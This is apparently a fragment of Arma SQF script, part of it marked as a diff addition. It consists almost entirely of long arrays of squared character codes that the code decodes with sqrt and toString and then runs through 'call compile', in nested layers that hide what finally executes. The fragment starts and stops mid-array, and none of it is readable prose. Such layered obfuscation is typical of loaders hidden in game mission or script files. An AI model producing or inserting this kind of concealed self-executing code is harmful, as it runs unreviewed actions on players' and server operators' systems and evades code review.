,2304,1936,2704,2601,2809,2916,1936,2401,2304,2916,2304,3249,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2401,2809,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2401,3136,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3025,3249,2500,2401,1936,2916,2704,2304,2304,1936,2704,3025,2916,2401,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2916,2704,2304,2304,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2401,2401,3136,3136,2401,1936,2401,2401,2809,2916,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2916,2704,2304,2304,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2704,1936,2704,3025,2916,2401,1936,2916,2704,2304,2304,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,3136,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2500,3025,2304,2704,1936,3136,2401,2304,2304,1936,2401,2601,2704,2809,2916,1936,3249,3136,2304,2401,1936,2704,3025,2916,2401,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2601,2704,2809,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,3249,2500,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2704,3025,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,2809,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2601,2500,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,2809,2916,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3249,2704,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2704,2601,2809,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2916,2704,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2916,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2304,2304,2304,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3025,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2500,3136,2304,3249,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2916,3025,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2809,2401,3136,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2401,2809,2916,1936,2809,2304,2704,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2500,3025,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,3249,2601,2916,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2916,3025,2500,2704,1936,3249,3136,2304,2401,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2500,2500,2809,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2704,2601,2809,2916,1936,2916,2704,2304,2304,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2704,3249,2304,2304,1936,2401,2500,3249,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2916,3025,2500,2704,1936,3249,3136,2304,2401,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2809,2916,2500,2809,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,3136,2916,2704,3249,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2809,2401,2500,3249,1936,2401,2500,2809,2704,2704,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,3249,2500,2704,1936,3249,2704,2304,3249,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2304,2401,1936,3136,2500,3136,2401,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2809,2500,2401,1936,2401,3249,2601,2916,1936,2401,2809,2500,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2809,2500,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,3025,2500,2401,1936,3249,2304,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2601,3025,2500,2401,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,3249,2916,2304,2704,1936,2401,2601,3249,2500,2704,1936,2401,2500,2401,2304,2304,1936,2500,2601,2304,2704,1936,2704,3249,2304,2304,1936,2500,2916,2304,2401,1936,2401,2704,3136,3136,2704,1936,2916,2500,2704,2401,1936,2809,3249,2500,3249,1936,2704,2500,2500,2809,1936,2401,2601,2916,3136,3249,1936,2401,2401,2704,2704,3249,1936,2401,2500,2809,2704,2704,1936,2916,2304,3136,2704,1936,2601,2500,2704,3249,1936,2704,2704,3136,3249,1936,2500,2704,2304,2401,1936,3136,2401,2304,2304,1936,3025,3025,2704,2704,1936,2704,2916,2500,2704,1936,2809,2916,2500,2809,1936,3025,2500,2500,2809,1936,2809,3025,3025,2916,1936,2401,2500,3025,2916,3249,1936,2401,2401,2916,2916,2704,1936,2809,2704,3025,2916,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,3249,2500,2401,1936,2704,3025,2916,2401,1936,2401,2500,2601,2500,2401,1936,2500,2809,2304,2304,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,3025,2601,3249,2916,1936,2704,2601,2809,2916,1936,3249,3136,2304,2401,1936,2916,2704,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2304,2304,2304,1936,2601,2401,2601,2916,1936,2401,2704,2916,2704,2401,1936,2500,3025,2304,2704,1936,2401,2304,2704,2304,2704,1936,2500,3136,2304,3249,1936,2916,3025,2500,2704,1936,2401,2500,3249,3249,2916,1936,2809,2401,3136,2704,1936,2809,2304,2704,2401,1936,2601,2304,2500,2809,1936,2916,2809,2916,2401,1936,2916,3136,3136,3249,1936,2401,2704,2401,2916,2401,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2304,2401,1936,3025,2304,2809,2916,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2601,3025,2500,2401,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2704,2500,2500,2809,1936,2704,2601,2809,2916,1936,2704,2704,3136,3249,1936,2704,2916,2500,2704,1936,2704,3025,2916,2401,1936,2704,3249,2304,2304,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2809,2601,2500,3249,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2809,3025,3025,2916,1936,2809,3249,2500,3249,1936,2916,2304,3136,2704,1936,2916,2500,2704,2401,1936,2916,2704,2304,2304,1936,2916,2809,2916,2401,1936,2916,3025,2500,2704,1936,2916,3136,3136,3249,1936,3025,2304,2809,2916,1936,3025,2500,2500,2809,1936,3025,2601,3249,2916,1936,3025,2809,2916,3249,1936,3025,3025,2704,2704,1936,3025,3249,2500,2401,1936,3136,2401,2304,2304,1936,3249,2704,2304,3249,1936,3249,2916,2304,2704,1936,3249,3136,2304,2401,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2304,2401,1936,2401,2304,2704,2304,2704,1936,2401,2304,2916,2304,3249,1936,2401,2304,3136,2401,2916,1936,2401,2401,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2401,2401,2704,2704,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,3136,3136,2401,1936,2401,2500,2401,2304,2304,1936,2401,2500,2601,2500,2401,1936,2401,2500,2809,2704,2704,1936,2401,2500,3025,2916,3249,1936,2401,2500,3249,3249,2916,1936,2401,2601,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2601,2916,3136,3249,1936,2401,2601,3249,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2704,2704,2304,2304,1936,2401,2704,2916,2704,2401,1936,2401,2704,3136,3136,2704,1936,2500,2601,2304,2704,1936,2500,2704,2304,2401,1936,2500,2809,2304,2304,1936,2500,2916,2304,2401,1936,2500,3025,2304,2704,1936,2500,3136,2304,3249,1936,2500,3249,2401,2916,1936,2601,2304,2500,2809,1936,2601,2401,2601,2916,1936,2601,2500,2704,3249,1936,2401,2809,2500,2401,1936,2601,2704,3136,2401,1936,2401,2809,2401,2500,3249,1936,2401,2401,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2304,2500,2704,1936,2601,3136,2704,2704,1936,2601,3025,2500,2401,1936,2500,2601,2304,2704,1936,2401,2916,3136,2401,1936,2401,2601,2704,2809,2916,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2500,2401,2304,2304,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2916,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2704,2809,2916,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2704,2304,2704,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2304,2401,1936,2401,2809,2401,2500,3249,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,2401,2601,2916,3136,3249,1936,2401,2601,2500,2500,2809,1936,2401,2304,3136,2401,2916,1936,2704,2601,2809,2916,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2401,2704,2704,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2401,2704,2704,2304,2304,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2704,3025,2916,2401,1936,3249,2704,2304,3249,1936,3249,3136,2304,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2704,2500,2500,2809,1936,2401,2500,3249,3249,2916,1936,2401,2500,3249,3249,2916,1936,3249,2704,2304,3249,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,3249,3136,2304,2401,1936,3249,2704,2304,3249,1936,2401,2401,2916,2916,2704,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2401,2500,2601,2500,2401,1936,2401,2401,3136,3136,2401,1936,2401,2500,2809,2704,2704,1936,2401,2401,2304,2500,2809,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2500,2601,2500,2401,1936,2916,3136,3136,3249,1936,2401,2601,2704,2809,2916,1936,2401,2500,3249,3249,2916,1936,2401,2401,2304,2500,2809,1936,2401,2500,2401,2304,2304,1936,2401,2304,2916,2304,3249,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2601,3249,1936,2704,2401,1936,2809,3249,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2601,2500,1936,3249,3249,1936,2401,2401,2401,1936,2401,2304,3249,1936,2401,2401,2500,1936,2401,2304,2809,1936,2401,2304,3136,1936,2401,2304,2401,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,3136,2601,1936,2401,2401,2916,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,2304,1936,2401,2304,2601,1936,2601,2500,1936,3249,2809,1936,2704,3249,1936,2809,3249,1936,2401,2500,2809,1936,2809,3249,8649,3481];call compile toString _1;};
+	[]call{private['_1'];_1=[];{_1 pushBack sqrt _x}forEach [9801,9409,11664,11664,1024,9801,12321,11881,12544,11025,11664,10201,1024,13456,12321,13225,13456,12996,11025,12100,10609,8281,3249,2401,1936,3249,2601,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2401,2500,2601,1936,2401,2401,2500,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,3136,1936,3249,3025,1936,2401,2401,2916,1936,2401,2304,2401,1936,3249,2401,1936,2601,3249,1936,3249,2809,1936,2704,3249,1936,2601,3249,1936,3249,2601,1936,2809,3249,1936,3249,2809,1936,2704,3249,1936,2916,2401,1936,3249,2401,1936,3249,2601,1936,2809,3249,1936,2401,2500,2601,1936,3249,2809,1936,2704,3249,1936,2601,2500,1936,2401,2401,2500,1936,2401,2401,3025,1936,2401,2401,2809,1936,2401,2304,2704,1936,2916,2916,1936,3249,3025,1936,3249,3249,1936,2401,2304,3025,1936,2601,2500,1936,2401,2401,2809,1936,2401,2401,2601,1936,2401,2401,2704,1936,2401,2401,2916,1936,2601,2500,1936,3249,2809,1936,2401,2500,2304,1936,2401,2500,2809,1936,2401,2304,2500,1936,2401,2401,2401,1936,2401,2401,2704,1936,2916,3249,1936,3249,3025,1936,3249,3249,1936,2401,2304,2704,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,2916,2809,1936,2401,2401,2704,1936,2401,2401,2704,1936,3249,3025,1936,2401,2500,2401,1936,2704,2304,1936,2601,3249,1936,3136,2500,3136,2401,1936,2